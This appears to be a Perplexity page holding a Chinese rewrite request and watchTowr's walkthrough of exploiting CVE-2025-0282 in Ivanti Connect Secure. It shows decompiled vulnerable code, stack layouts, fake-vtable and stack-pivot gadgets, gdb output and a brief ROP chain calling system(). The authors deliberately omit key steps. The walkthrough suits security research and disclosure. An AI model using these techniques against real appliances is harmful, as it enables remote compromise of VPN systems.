---
title: 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。 ------------ Exploitation Walkthrough and Techniques - Ivanti Connect Secure RCE (CVE-2025-0282) Exploitation Walkthrough and Techniques - Ivanti Connect Secure RCE (CVE-2025-0282) As we saw in our previous blogpost, we fully analyzed Ivanti’s most recent unauthenticated Remote Code Execution vulnerability in their Connect Secure (VPN) appliance. Specifically, we analyzed CVE-2025-0282. Today, we’re going to walk through exploitation. Once again, however, stopping short of providing the world with a Detection Artifact Generator (also known as a proof of concept, apparently) - as previously mentioned, release and sharing of our PoC (in a to-be-decided form) will be held back until the 16th Jan ‘25. Note from the editor: Before that - an observation. We've seen a number of security executives and leaders tell the world how unfair it is that people could possibly criticize Ivanti and their continuous spate of mission critical vulnerabilities in mission critical appliances - because "attackers always use new [in 1999] techniques" and zero-day can happen to anyone :^) We believe this is a real-world example of stockholm syndrome - get help. We agree - modern security engineering is hard - but none of this is modern. We are discussing vulnerability classes - with no sophisticated trigger mechanisms that fuzzing couldnt find - discovered in the 1990s, that can be trivially discovered via basic fuzzing, SAST (the things product security teams do with real code access). As an industry, should we really be communicating that these vulnerability classes are simply too complex for a multi-billion dollar technology company that builds enterprise-grade, enterprise-priced network security solutions to proactively resolve? We've enjoyed walking through the exploitation of this vulnerability, and we’re excited to share our work with everyone. So without further ado, onto the fun part… Previously On ‘Reproducing CVE-2025-0282’ In our previous post, we discussed the root cause of CVE-2025-0282 - a stack-based buffer overflow in code designed to handle IF-T connections. The following analysis is based on decompiled code from an Ivanti Connect Secure appliance running 22.7R2.3. The vulnerability specifically is found in the binary /home/bin/web, which handles all incoming HTTP requests and VPN protocols - including IFT TLS - for an Ivanti Connect Secure appliance. Previously, we identified that if an attacker sends a clientCapabilities block with more than 256 bytes, they’ll spill over into other stack variables, and eventually into the return address, where RCE awaits. As you may recall, and repeated here if not, we identified that Ivanti developers used strncpy, instead of the unsafe strcpy when handling clientCapabilities, but had mistakenly passed in the size of the input string - not the size of the destination buffer - as the size limit. As we can see in the output of decompiled below, the dest buffer is defined with a 256 byte size. Subsequently, at line 22, we can see that the value of the clientCapabilities parameter is extracted, with the length of this value calculated at line 25 and copied into the dest buffer at line 31. This ultimately provides the smoking gun for the vulnerability that we’re hunting and allows for an out-of-bound write. 2: int __cdecl ift_handle_1(int a1, IftTlsHeader *a2, char *a3) 3: { 4: 5: int v18; 6: int v19; 7: char dest[256]; // [esp+120h] [ebp-8ECh] BYREF 8: char object_to_be_freed[4]; // [esp+220h] [ebp-7ECh] BYREF 9: void *ptr; // [esp+224h] [ebp-7E8h] 10: int v20; // [esp+228h] [ebp-7E4h] 11: int v21; // [esp+22Ch] [ebp-7E0h] 12: int v22; // [esp+230h] [ebp-7DCh] 13: char v23; // [esp+234h] [ebp-7D8h] 14: char v24; // [esp+235h] [ebp-7D7h] 15: void *v25; // [esp+23Ch] [ebp-7D0h] 16: _DWORD v26[499]; // [esp+240h] [ebp-7CCh] BYREF 17: 18: 19: [..SNIP..] 20: 21: 22: clientCapabilities = getKey(req, "clientCapabilities"); 23: if ( clientCapabilities != NULL ) 24: { 25: clientCapabilitiesLength = strlen(clientCapabilities); 26: if ( clientCapabilitiesLength != 0 ) 27: connInfo->clientCapabilities = clientCapabilities; 28: } 29: } 30: memset(dest, 0, sizeof(dest)); 31: strncpy(dest, connInfo->clientCapabilities, clientCapabilitiesLength); 32: 33: v24 = 46; 34: v25 = &v57; 35: if ( ((unsigned __int8)&v57 & 2) != 0 ) 36: { 37: LOBYTE(v24) = 44; 38: v57 = 0; 39: v25 = (__int16 *)&v58; 40: } 41: memset(v25, 0, 4 * (v24 >> 2)); 42: v26 = &v25[2 * (v24 >> 2)]; 43: if ( (v24 & 2) != 0 ) 44: *v26 = 0; 45: na = 46; 46: 47: 48: (*(void (__cdecl **)(int, __int16 *))(*(_DWORD *)a1 + 0x48))(a1, &v22); 49: 50: 51: isValid = 1; 52: EPMessage::~EPMessage((EPMessage *)v18); 53: DSUtilMemPool::~DSUtilMemPool((DSUtilMemPool *)object_to_be_freed); 54: return isValid; 55: 56: 57: } Now that we’ve gone through this section, we can hear you already: "Great, but what does the stack layout look like?” Stack It Up Well, we’ve laid this out for you below. We have our dest buffer and a number of other variables, and as you can see - we have our stored return address. Now, in normal and easier situations, you’d write enough data via the out-of-bounds write flaw to overwrite this return address - made easier because stack canaries aren't in use - to gain control of our instruction pointer. However, life is not so simple, and we have an issue: +---------------------+ | v18 (int) | +---------------------+ | v19 (int) | +---------------------+ | dest[256] | <- 256 bytes +---------------------+ | object_to_be_freed | <- 4 bytes +---------------------+ | ptr (void *) | +---------------------+ | v20 (int) | +---------------------+ | v21 (int) | +---------------------+ | v22 (int) | +---------------------+ | v23 (char) | +---------------------+ | v24 (char) | +---------------------+ | v25 (void *) | +---------------------+ | v26[499] | <- 499 DWORDs (4 bytes each) +---------------------+ | Return Address | +---------------------+ | int a1 | +---------------------+ | IftTlsHeader *a2 | +---------------------+ Our problem is specific: We have code that is executed before the function is returned (i.e. where our overwritten return address would be used), However, this code utilizes the object_to_be_freed variable that lives on the stack after our dest buffer, and given this object is destroyed before the return is done, it causes the free() function to throw an exception due to an invalid address. Let’s focus on a small portion of the previous code. The following code is executed before the function is returned. The problem is that the object_to_be_freed variable lives on the stack after our dest buffer, and since this object is destroyed before the return, the free() function throws an exception due to an invalid address. This (decompiled) code is shown below: 51: isValid = 1; 52: EPMessage::~EPMessage((EPMessage *)v18); 53: DSUtilMemPool::~DSUtilMemPool((DSUtilMemPool *)object_to_be_freed); 54: return isValid; This presents us with a blunt problem when pursuing actual exploitation - we’re prevented from hitting the ret instruction unless we can actually provide a valid address. Surprisingly, there is full ASLR and PIE, and thus this will be cumbersome. What if there is another way? VTable VTable VTable Well, let’s stare at the decompiled code again—but this time, we'll look at another piece of decompiled code that is executed before we hit our needed return. 48: (*(void (__cdecl **)(int, __int16 *))(*(_DWORD *)a1 + 0x48))(a1, &v22); 49: 50: 51: isValid = 1; 52: EPMessage::~EPMessage((EPMessage *)v18); 53: DSUtilMemPool::~DSUtilMemPool((DSUtilMemPool *)object_to_be_freed); 54: return isValid; Do you see what we see? At line 48, the a1 variable is dereferenced, and then a virtual function at offset 72 (or 0x48 hex) is invoked. (*(_DWORD *)a1 + 0x48)) The following is the disassembly that performs this function invocation. In this, eax is populated with a pointer stored on the stack, and then this pointer is dereferenced and eax is updated. Finally, eax plus 0x48 is dereferenced once again to calculate a function address to call. mov eax, [esp+0A0Ch+arg_0] mov eax, [eax] mov [esp+0A0Ch+src], edx mov edx, [esp+0A0Ch+arg_0] mov [esp+0A0Ch+n], 2Eh ; '.' ; int mov [esp+0A0Ch+var_A0C], edx call dword ptr [eax+48h] Eagle-eyed readers may recognize that this kind of usage of the eax register is typical in C++ when the this pointer is involved. Specifically, accessing the value pointed to by this and adding a certain offset indicates that the vtable is being used to invoke virtual functions. Hopefully, the following diagram we painted by hand helps show exactly what is going on: Memory Layout: +--------------------------+ | *this Pointer | +--------------------------+ | v +--------------------------+ | vtable Address | <- Points to the vtable +--------------------------+ | v +--------------------------+ | vtable (Virtual Table) | <- Array of pointers to virtual functions +--------------------------+ | *Function[0x04] | +--------------------------+ | *Function[0x08] | +--------------------------+ | *Function[0x0C] | +--------------------------+ | ... | +--------------------------+ | *Function[0x48] | <- Points to a sequence of x86 instructions +--------------------------+ | v +--------------------------+ | Function[0x48] Prologue | +--------------------------+ | push ebp | <- Save base pointer +--------------------------+ | mov ebp, esp | <- Set base pointer +--------------------------+ | sub esp, 0x20 | <- Allocate stack space +--------------------------+ | ... | <- Additional instructions +--------------------------+ So what does this mean for us, exploitation-savants? The *this pointer is actually stored on the stack right after the return address as a1 , which is the first argument to the function that we’re leveraging the out-of-bounds primitive within: +---------------------+ | v18 (int) | +---------------------+ | v19 (int) | +---------------------+ | dest[256] | <- 256 bytes +---------------------+ | object_to_be_freed | <- 4 bytes +---------------------+ | ptr (void *) | +---------------------+ | v20 (int) | +---------------------+ | v21 (int) | +---------------------+ | v22 (int) | +---------------------+ | v23 (char) | +---------------------+ | v24 (char) | +---------------------+ | v25 (void *) | +---------------------+ | v26[499] | <- 499 DWORDs (4 bytes each) +---------------------+ | Return Address | +---------------------+ | int a1 | +---------------------+ | IftTlsHeader *a2 | +---------------------+ We’re sure you can see where we’re headed with this. Our theory was that if we overflow past the return address and overwrite the this pointer, we can actually gain control of the execution “before” the object_to_be_freed variable is destroyed. Hunting For Our Gadget Although we can trivialize our plan into 1 sentence - this is not straightforward to execute. We need to fake a vtable - more specifically, we need a valid pointer that points to another pointer so that when 0x48 is added, the pointer will point to valid instructions that are useful to us - aka, our first gadget. Before we find this unicorn, we need to know what we’re actually looking for. What actually would be useful to us? Put simply - if we can find a gadget that does an early ret and doesn’t segfault beforehand, we can gain control of the instruction pointer. After A Bit Of Time Through the power of -time, mystery and hopes/dreams, we eventually found a gadget that met our requirements. Let’s take a look at our next illustration: Memory Layout: +--------------------------+ | *fake_this Pointer | +--------------------------+ | v +--------------------------+ | fake_vtable Address | <- Points to the vtable +--------------------------+ | v +--------------------------+ | fake vtable | +--------------------------+ | *gadget_0[0x48] | <- Points to a sequence of x86 instructions +--------------------------+ | v +--------------------------+ | gadget_0[0x48] | +--------------------------+ | xor eax, eax | <- Clear EAX register +--------------------------+ | ret | <- Return to caller +--------------------------+ As a brief explainer - we found a fake_this pointer that points to an address that holds another address which - when we add 0x48 to it - will point to a gadget that performs xor eax, eax and then a ret . Perfect, we’re done? Nope, life is never so easy. We’re faced with another problem - when the ret is about to be executed, the stack looks like this: gdb> x/10wx $esp 0xff9fa6e0: 0xff9fa800 0x56d7fe10 0x00000d35 0x56767c7f 0xff9fa6f0: 0x00000032 0x5677d44c 0x00000000 0x00000000 0xff9fa700: 0x00000000 0x00000000 None of these values are in our control, and so the ret that we longed for will go somewhere that is useless to us. Pivot Duck Slide Around The Stack Although we were dismayed by this stack given it did not look at all hopeful, looking further down the stack shows something promising. The bytes we have sprayed as part of our initial payload show up at exactly $esp+0x120. Therefore, if we can perform a stack pivot and shift $esp to point to our controlled buffer, we can gain an early eip control instead of relying on the original IF-T parser epilogue. gdb> x/100wx $esp 0xff9fa6e0: 0xff9fa800 0x56d7fe10 0x00000d35 0x56767c7f 0xff9fa6f0: 0x00000032 0x5677d44c 0x00000000 0x00000000 0xff9fa700: 0x00000000 0x00000000 0x00000d34 0xff9fa752 0xff9fa710: 0x00001547 0xff9fa728 0x00000000 0xff9fa900 0xff9fa720: 0x00000000 0x00000000 0xff9fa900 0xf7a68490 0xff9fa730: 0xff9fa900 0x00000003 0x00000010 0xff9fa948 0xff9fa740: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa750: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa760: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa770: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa780: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa790: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa7a0: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa7b0: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa7c0: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa7d0: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa7e0: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa7f0: 0x00000000 0x00000000 0x00000000 0x00000000 0xff9fa800: 0x61616161 0x61616162 0x61616163 0x61616164 0xff9fa810: 0x61616165 0x61616166 0x61616167 0x61616168 0xff9fa820: 0x61616169 0x6161616a 0x6161616b 0x6161616c 0xff9fa830: 0x6161616d 0x6161616e 0x6161616f 0x61616170 0xff9fa840: 0x61616171 0x61616172 0x61616173 0x61616174 0xff9fa850: 0x61616175 0x61616176 0x61616177 0x61616178 0xff9fa860: 0x61616179 0x6261617a 0x62616162 0x62616163 As discussed though, we can’t just use any address for our initial gadget - we need to go through the whole process again and find a valid pointer that can be faked as a this pointer which points to a vtable, where a member at offset+0x48 performs both a stack pivot and an early ret. It’s a good thing that the Ivanti web binary contains so many libraries. After spending a while looking around and discarding gadgets that would throw a segfault during execution by dereferencing various registers, we found something magical. A Gadget From The Gods Not only does our newly found shiny and magical gadget perform a stack pivot, but it also does an early ret and has no instruction that causes an early segfault. Perfect! Memory Layout: +--------------------------+ | *fake_this Pointer | +--------------------------+ | v +--------------------------+ | fake_vtable Address | <- Points to the vtable +--------------------------+ | v +--------------------------+ | fake vtable | +--------------------------+ | *gadget_0[0x48] | <- Points to a sequence of x86 instructions +--------------------------+ | v +--------------------------+ | gadget_0[0x48] | +--------------------------+ | mov ebx, 0xfffffff0 | <- Load value into EBX +--------------------------+ | add esp, 0x204C | <- Adjust stack pointer +--------------------------+ | mov eax, ebx | <- Copy EBX to EAX +--------------------------+ | pop ebx | <- Restore EBX +--------------------------+ | pop esi | <- Restore ESI +--------------------------+ | pop edi | <- Restore EDI +--------------------------+ | pop ebp | <- Restore EBP +--------------------------+ | ret | <- Return to caller +--------------------------+ Now that we have the correct gadget we should be able to gain control of the value in eip. Thread 2.1 "web" received signal SIGSEGV, Segmentation fault. [Switching to Thread 10799.10799] **0xdeadbeef** in ?? () (gdb) bt #0 0xdeadbeef in ?? () #1 0x6974000a in ?? () #2 0x253a6e6f in ?? () #3 0x6f702032 in ?? () #4 0x6c207472 in ?? () #5 0x3a747369 in ?? () #6 0x33252720 in ?? () #7 0xff002e27 in ?? () #8 0x00000001 in ?? () #9 0x00000000 in ?? () ROP n ROLL Let’s look where we are: eip control is achieved, We can ROP with no limitations, The stack is where we want it. In this situation, crafting a ROP chain that achieves RCE should be logically straightforward. mov_eax_esp_ret = p32(0xf29e92c3) # mov eax, esp; ret add_eax_8_ret = p32(0xf5068858) # add eax, 8; ret; add_eax_8_ret = p32(0xf5068858) # add eax, 8; ret; add_eax_8_ret = p32(0xf5068858) # add eax, 8; ret; add_eax_8_ret = p32(0xf5068858) # add eax, 8; ret; pop_esi_ret = p32(0xf4f5de27) # pop esi; ret; esi = p32(0xf5a07d40) # system set_arg_call_esi = p32(0xf4f5e265) # mov dword ptr [esp], eax; call esi; Let’s check it out.. 0:00 /0:28 1× Building The Exploit We’ve gone through exploitation, and how we approach this from a technique perspective. However, for the readers at home who are hoping to use this to craft their own exploit, we are omitting some details that you will need to complete yourself. This is purposeful. You will need to: Find the address of the gadgets we discussed, Write a loop that brute forces ASLR. Since this is an x86 target, and ASLR is only applied to certain ranges, this should be an easy task. As previously discussed, we will not answer these questions even in our soon-to-be-released Detection Artifact Generator—sorry, kiddos. Conclusion We hope you’ve enjoyed this walkthrough of how we approached exploiting this vulnerability. As discussed, we have intentionally left out crucial key mechanisms needed to actually build a PoC and weaponize this vulnerability. At watchTowr, we passionately believe that continuous security testing is the future and that rapid reaction to emerging threats single-handedly prevents inevitable breaches. With the watchTowr Platform, we deliver this capability to our clients every single day - it is our job to understand how emerging threats, vulnerabilities, and TTPs could impact their organizations, with precision
date: 2025-02-09
source: https://www.perplexity.ai/search/shi-yong-zui-jian-dan-de-biao-0DFnnAv4TtupHS024idCvg
---

**User:** 使用最简单的表达方式，重新描述下面内容，重点在于介绍清楚技术知识点，使得人们更易于看明白。扩展对应的内容，增加接地气的实际应用例子和对应的demo代码，让中国人更好理解。注意减少偏见的内容、晦涩难懂的内容、错误的内容、冗余的内容、信息量低的内容，以markdown格式输出。加上更多案例和准确的数值指标，直接表达重写后的结果，不要输出其他无关内容。

------------
Exploitation Walkthrough and Techniques - Ivanti Connect Secure RCE (CVE-2025-0282)
Exploitation Walkthrough and Techniques - Ivanti Connect Secure RCE (CVE-2025-0282)
As we saw in our previous blogpost, we fully analyzed Ivanti’s most recent unauthenticated Remote Code Execution vulnerability in their Connect Secure (VPN) appliance. Specifically, we analyzed CVE-2025-0282.

Today, we’re going to walk through exploitation. Once again, however, stopping short of providing the world with a Detection Artifact Generator (also known as a proof of concept, apparently) - as previously mentioned, release and sharing of our PoC (in a to-be-decided form) will be held back until the 16th Jan ‘25.

Note from the editor: Before that - an observation. We've seen a number of security executives and leaders tell the world how unfair it is that people could possibly criticize Ivanti and their continuous spate of mission critical vulnerabilities in mission critical appliances - because "attackers always use new [in 1999] techniques" and zero-day can happen to anyone :^)

We believe this is a real-world example of stockholm syndrome - get help.

We agree - modern security engineering is hard - but none of this is modern. We are discussing vulnerability classes - with no sophisticated trigger mechanisms that fuzzing couldnt find - discovered in the 1990s, that can be trivially discovered via basic fuzzing, SAST (the things product security teams do with real code access).

As an industry, should we really be communicating that these vulnerability classes are simply too complex for a multi-billion dollar technology company that builds enterprise-grade, enterprise-priced network security solutions to proactively resolve?
We've enjoyed walking through the exploitation of this vulnerability, and we’re excited to share our work with everyone.

So without further ado, onto the fun part…

Previously On ‘Reproducing CVE-2025-0282’
In our previous post, we discussed the root cause of CVE-2025-0282 - a stack-based buffer overflow in code designed to handle IF-T connections.

The following analysis is based on decompiled code from an Ivanti Connect Secure appliance running 22.7R2.3. The vulnerability specifically is found in the binary /home/bin/web, which handles all incoming HTTP requests and VPN protocols - including IFT TLS - for an Ivanti Connect Secure appliance.

Previously, we identified that if an attacker sends a clientCapabilities block with more than 256 bytes, they’ll spill over into other stack variables, and eventually into the return address, where RCE awaits.

As you may recall, and repeated here if not, we identified that Ivanti developers used strncpy, instead of the unsafe strcpy when handling clientCapabilities, but had mistakenly passed in the size of the input string - not the size of the destination buffer - as the size limit.

As we can see in the output of decompiled below, the dest buffer is defined with a 256 byte size. Subsequently, at line 22, we can see that the value of the clientCapabilities parameter is extracted, with the length of this value calculated at line 25 and copied into the dest buffer at line 31.

This ultimately provides the smoking gun for the vulnerability that we’re hunting and allows for an out-of-bound write.


 2:  int __cdecl ift_handle_1(int a1, IftTlsHeader *a2, char *a3)
 3:  {
 4:  
 5:      int v18;
 6:      int v19;
 7:      char dest[256]; // [esp+120h] [ebp-8ECh] BYREF
 8:      char object_to_be_freed[4]; // [esp+220h] [ebp-7ECh] BYREF
 9:      void *ptr; // [esp+224h] [ebp-7E8h]
10:      int v20; // [esp+228h] [ebp-7E4h]
11:      int v21; // [esp+22Ch] [ebp-7E0h]
12:      int v22; // [esp+230h] [ebp-7DCh]
13:      char v23; // [esp+234h] [ebp-7D8h]
14:      char v24; // [esp+235h] [ebp-7D7h]
15:      void *v25; // [esp+23Ch] [ebp-7D0h]
16:      _DWORD v26[499]; // [esp+240h] [ebp-7CCh] BYREF
17:  
18:  
19:      [..SNIP..]
20:  
21:  
22:      clientCapabilities = getKey(req, "clientCapabilities");
23:      if ( clientCapabilities != NULL )
24:      {
25:        clientCapabilitiesLength = strlen(clientCapabilities);
26:        if ( clientCapabilitiesLength != 0 )
27:  	      connInfo->clientCapabilities = clientCapabilities;
28:        }
29:      }
30:      memset(dest, 0, sizeof(dest));
31:      strncpy(dest, connInfo->clientCapabilities, clientCapabilitiesLength);
32:  
33:      v24 = 46;
34:      v25 = &v57;
35:      if ( ((unsigned __int8)&v57 & 2) != 0 )
36:      {
37:        LOBYTE(v24) = 44;
38:        v57 = 0;
39:        v25 = (__int16 *)&v58;
40:      }
41:      memset(v25, 0, 4 * (v24 >> 2));
42:      v26 = &v25[2 * (v24 >> 2)];
43:      if ( (v24 & 2) != 0 )
44:        *v26 = 0;
45:      na = 46;
46:  
47:  
48:      (*(void (__cdecl **)(int, __int16 *))(*(_DWORD *)a1 + 0x48))(a1, &v22);   
49:  
50:  
51:      isValid = 1;
52:      EPMessage::~EPMessage((EPMessage *)v18);
53:      DSUtilMemPool::~DSUtilMemPool((DSUtilMemPool *)object_to_be_freed);
54:      return isValid;
55:  
56:  
57:  }
Now that we’ve gone through this section, we can hear you already: "Great, but what does the stack layout look like?”

Stack It Up
Well, we’ve laid this out for you below. We have our dest buffer and a number of other variables, and as you can see - we have our stored return address.

Now, in normal and easier situations, you’d write enough data via the out-of-bounds write flaw to overwrite this return address - made easier because stack canaries aren't in use - to gain control of our instruction pointer.

However, life is not so simple, and we have an issue:

+---------------------+
| v18 (int)           |
+---------------------+
| v19 (int)           |
+---------------------+
| dest[256]           | <- 256 bytes
+---------------------+
| object_to_be_freed  | <- 4 bytes
+---------------------+
| ptr (void *)        |
+---------------------+
| v20 (int)           |
+---------------------+
| v21 (int)           |
+---------------------+
| v22 (int)           |
+---------------------+
| v23 (char)          |
+---------------------+
| v24 (char)          |
+---------------------+
| v25 (void *)        |
+---------------------+
| v26[499]            | <- 499 DWORDs (4 bytes each)
+---------------------+
| Return Address      |
+---------------------+
| int a1              |
+---------------------+
| IftTlsHeader *a2    |
+---------------------+

Our problem is specific:

We have code that is executed before the function is returned (i.e. where our overwritten return address would be used),
However, this code utilizes the object_to_be_freed variable that lives on the stack after our dest buffer, and given this object is destroyed before the return is done, it causes the free() function to throw an exception due to an invalid address.
Let’s focus on a small portion of the previous code. The following code is executed before the function is returned. The problem is that the object_to_be_freed variable lives on the stack after our dest buffer, and since this object is destroyed before the return, the free() function throws an exception due to an invalid address.

This (decompiled) code is shown below:

51:      isValid = 1;
52:      EPMessage::~EPMessage((EPMessage *)v18);
53:      DSUtilMemPool::~DSUtilMemPool((DSUtilMemPool *)object_to_be_freed);
54:      return isValid;
This presents us with a blunt problem when pursuing actual exploitation - we’re prevented from hitting the ret instruction unless we can actually provide a valid address.

Surprisingly, there is full ASLR and PIE, and thus this will be cumbersome. What if there is another way?

VTable VTable VTable
Well, let’s stare at the decompiled code again—but this time, we'll look at another piece of decompiled code that is executed before we hit our needed return.

48:      (*(void (__cdecl **)(int, __int16 *))(*(_DWORD *)a1 + 0x48))(a1, &v22);   
49:  
50:  
51:      isValid = 1;
52:      EPMessage::~EPMessage((EPMessage *)v18);
53:      DSUtilMemPool::~DSUtilMemPool((DSUtilMemPool *)object_to_be_freed);
54:      return isValid;
Do you see what we see?

At line 48, the a1 variable is dereferenced, and then a virtual function at offset 72 (or 0x48 hex) is invoked.

(*(_DWORD *)a1 + 0x48))
The following is the disassembly that performs this function invocation.

In this, eax is populated with a pointer stored on the stack, and then this pointer is dereferenced and eax is updated.

Finally, eax plus 0x48 is dereferenced once again to calculate a function address to call.

mov     eax, [esp+0A0Ch+arg_0]
mov     eax, [eax]
mov     [esp+0A0Ch+src], edx
mov     edx, [esp+0A0Ch+arg_0]
mov     [esp+0A0Ch+n], 2Eh ; '.' ; int
mov     [esp+0A0Ch+var_A0C], edx
call    dword ptr [eax+48h]
Eagle-eyed readers may recognize that this kind of usage of the eax register is typical in C++ when the this pointer is involved. Specifically, accessing the value pointed to by this and adding a certain offset indicates that the vtable is being used to invoke virtual functions.

Hopefully, the following diagram we painted by hand helps show exactly what is going on:

Memory Layout:

+--------------------------+
| *this Pointer            |
+--------------------------+
       |
       v
+--------------------------+
| vtable Address           | <- Points to the vtable
+--------------------------+
       |
       v
+--------------------------+
| vtable (Virtual Table)   | <- Array of pointers to virtual functions
+--------------------------+
| *Function[0x04]          |
+--------------------------+
| *Function[0x08]          |
+--------------------------+
| *Function[0x0C]          |
+--------------------------+
|       ...                |
+--------------------------+
| *Function[0x48]          | <- Points to a sequence of x86 instructions
+--------------------------+
       |
       v
+--------------------------+
| Function[0x48] Prologue  |
+--------------------------+
| push ebp                 | <- Save base pointer
+--------------------------+
| mov ebp, esp             | <- Set base pointer
+--------------------------+
| sub esp, 0x20            | <- Allocate stack space
+--------------------------+
| ...                      | <- Additional instructions
+--------------------------+

So what does this mean for us, exploitation-savants?

The *this pointer is actually stored on the stack right after the return address as a1 , which is the first argument to the function that we’re leveraging the out-of-bounds primitive within:

+---------------------+
| v18 (int)           |
+---------------------+
| v19 (int)           |
+---------------------+
| dest[256]           | <- 256 bytes
+---------------------+
| object_to_be_freed  | <- 4 bytes
+---------------------+
| ptr (void *)        |
+---------------------+
| v20 (int)           |
+---------------------+
| v21 (int)           |
+---------------------+
| v22 (int)           |
+---------------------+
| v23 (char)          |
+---------------------+
| v24 (char)          |
+---------------------+
| v25 (void *)        |
+---------------------+
| v26[499]            | <- 499 DWORDs (4 bytes each)
+---------------------+
| Return Address      |
+---------------------+
| int a1              |
+---------------------+
| IftTlsHeader *a2    |
+---------------------+
We’re sure you can see where we’re headed with this.

Our theory was that if we overflow past the return address and overwrite the this pointer, we can actually gain control of the execution “before” the object_to_be_freed variable is destroyed.

Hunting For Our Gadget
Although we can trivialize our plan into 1 sentence - this is not straightforward to execute.

We need to fake a vtable - more specifically, we need a valid pointer that points to another pointer so that when 0x48 is added, the pointer will point to valid instructions that are useful to us - aka, our first gadget.

Before we find this unicorn, we need to know what we’re actually looking for. What actually would be useful to us?

Put simply - if we can find a gadget that does an early ret and doesn’t segfault beforehand, we can gain control of the instruction pointer.

After A Bit Of Time
Through the power of -time, mystery and hopes/dreams, we eventually found a gadget that met our requirements.

Let’s take a look at our next illustration:

Memory Layout:

+--------------------------+
| *fake_this Pointer       |
+--------------------------+
       |
       v
+--------------------------+
| fake_vtable Address      | <- Points to the vtable
+--------------------------+
       |
       v
+--------------------------+
| fake vtable              |
+--------------------------+
| *gadget_0[0x48]          | <- Points to a sequence of x86 instructions
+--------------------------+
       |
       v
+--------------------------+
| gadget_0[0x48]           |
+--------------------------+
| xor eax, eax             | <- Clear EAX register
+--------------------------+
| ret                      | <- Return to caller
+--------------------------+
As a brief explainer - we found a fake_this pointer that points to an address that holds another address which - when we add 0x48 to it - will point to a gadget that performs xor eax, eax and then a ret .

Perfect, we’re done?

Nope, life is never so easy. We’re faced with another problem - when the ret is about to be executed, the stack looks like this:

gdb> x/10wx $esp
0xff9fa6e0:	0xff9fa800	0x56d7fe10	0x00000d35	0x56767c7f
0xff9fa6f0:	0x00000032	0x5677d44c	0x00000000	0x00000000
0xff9fa700:	0x00000000	0x00000000
None of these values are in our control, and so the ret that we longed for will go somewhere that is useless to us.

Pivot Duck Slide Around The Stack
Although we were dismayed by this stack given it did not look at all hopeful, looking further down the stack shows something promising.

The bytes we have sprayed as part of our initial payload show up at exactly $esp+0x120.

Therefore, if we can perform a stack pivot and shift $esp to point to our controlled buffer, we can gain an early eip control instead of relying on the original IF-T parser epilogue.

gdb> x/100wx $esp
0xff9fa6e0:	0xff9fa800	0x56d7fe10	0x00000d35	0x56767c7f
0xff9fa6f0:	0x00000032	0x5677d44c	0x00000000	0x00000000
0xff9fa700:	0x00000000	0x00000000	0x00000d34	0xff9fa752
0xff9fa710:	0x00001547	0xff9fa728	0x00000000	0xff9fa900
0xff9fa720:	0x00000000	0x00000000	0xff9fa900	0xf7a68490
0xff9fa730:	0xff9fa900	0x00000003	0x00000010	0xff9fa948
0xff9fa740:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa750:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa760:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa770:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa780:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa790:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa7a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa7b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa7c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa7d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa7e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa7f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xff9fa800:	0x61616161	0x61616162	0x61616163	0x61616164
0xff9fa810:	0x61616165	0x61616166	0x61616167	0x61616168
0xff9fa820:	0x61616169	0x6161616a	0x6161616b	0x6161616c
0xff9fa830:	0x6161616d	0x6161616e	0x6161616f	0x61616170
0xff9fa840:	0x61616171	0x61616172	0x61616173	0x61616174
0xff9fa850:	0x61616175	0x61616176	0x61616177	0x61616178
0xff9fa860:	0x61616179	0x6261617a	0x62616162	0x62616163
As discussed though, we can’t just use any address for our initial gadget - we need to go through the whole process again and find a valid pointer that can be faked as a this pointer which points to a vtable, where a member at offset+0x48 performs both a stack pivot and an early ret.

It’s a good thing that the Ivanti web binary contains so many libraries.

After spending a while looking around and discarding gadgets that would throw a segfault during execution by dereferencing various registers, we found something magical.

A Gadget From The Gods
Not only does our newly found shiny and magical gadget perform a stack pivot, but it also does an early ret and has no instruction that causes an early segfault.

Perfect!

Memory Layout:

+--------------------------+
| *fake_this Pointer       |
+--------------------------+
       |
       v
+--------------------------+
| fake_vtable Address      | <- Points to the vtable
+--------------------------+
       |
       v
+--------------------------+
| fake vtable              |
+--------------------------+
| *gadget_0[0x48]          | <- Points to a sequence of x86 instructions
+--------------------------+
       |
       v
+--------------------------+
| gadget_0[0x48]           |
+--------------------------+
| mov ebx, 0xfffffff0      | <- Load value into EBX
+--------------------------+
| add esp, 0x204C          | <- Adjust stack pointer
+--------------------------+
| mov eax, ebx             | <- Copy EBX to EAX
+--------------------------+
| pop ebx                  | <- Restore EBX
+--------------------------+
| pop esi                  | <- Restore ESI
+--------------------------+
| pop edi                  | <- Restore EDI
+--------------------------+
| pop ebp                  | <- Restore EBP
+--------------------------+
| ret                      | <- Return to caller
+--------------------------+

Now that we have the correct gadget we should be able to gain control of the value in eip.

Thread 2.1 "web" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 10799.10799]
**0xdeadbeef** in ?? ()
(gdb) bt
#0  0xdeadbeef in ?? ()
#1  0x6974000a in ?? ()
#2  0x253a6e6f in ?? ()
